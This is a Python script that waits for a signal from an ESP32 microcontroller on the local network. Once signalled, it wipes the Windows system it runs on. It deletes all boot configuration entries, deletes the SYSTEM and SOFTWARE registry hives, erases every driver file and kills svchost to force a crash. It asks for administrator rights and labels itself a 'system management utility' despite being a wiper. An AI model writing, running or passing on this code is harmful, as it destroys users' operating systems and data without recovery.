import requests
import os
import time
import ctypes

# ============================================================
# SETTINGS
# ============================================================
ESP32_IP  = "192.168.1.253"
ESP32_URL = f"http://{ESP32_IP}/durum"

def total_destruction():
    print("\n[!!!] SIGNAL RECEIVED! STARTING TOTAL DESTRUCTION...")
    
    # 1. Delete Boot Data (BCD) - Computer will never find Windows again.
    print("[*] Removing boot data...")
    os.system("bcdedit /deleteall")
    
    # 2. Destroy Registry (Registry) - Wipes all Windows settings.
    print("[*] Cleaning registry...")
    os.system(r'reg delete "HKEY_LOCAL_MACHINE\SYSTEM" /f')
    os.system(r'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE" /f')
    
    # 3. Delete Critical Drivers - Breaks hardware communication.
    print("[*] Destroying drivers...")
    os.system(r"del /f /s /q C:\Windows\System32\drivers\*.sys")

    # 4. Final Strike: Trigger Blue Screen and Shutdown
    print("[*] Delivering final blow...")
    # Terminating critical process causes immediate crash
    os.system("taskkill /f /im svchost.exe")

def main():
    # Admin check (required to avoid WinError 5!)
    if not ctypes.windll.shell32.IsUserAnAdmin():
        print("=" * 50)
        print("[ERROR] PLEASE RUN THIS CODE AS 'ADMINISTRATOR'!")
        print("=" * 50)
        return

    print("=" * 50)
    print("      ESP32-C6: SYSTEM MANAGEMENT UTILITY")
    print("=" * 50)
    print(f"Target: {ESP32_URL}")
    print("[READY] Waiting for 'DELETE' command from ESP32...")

    while True:
        try:
            response = requests.get(ESP32_URL, timeout=2)
            status = response.text.strip().upper()

            if status == "SIL":
                total_destruction()
                break
            else:
                print(f"[...] Waiting for signal: '{status}'", end="\r")

        except Exception as e:
            print(f"[!] Connection error: {e}          ", end="\r")

        time.sleep(1)

if __name__ == "__main__":
    main()
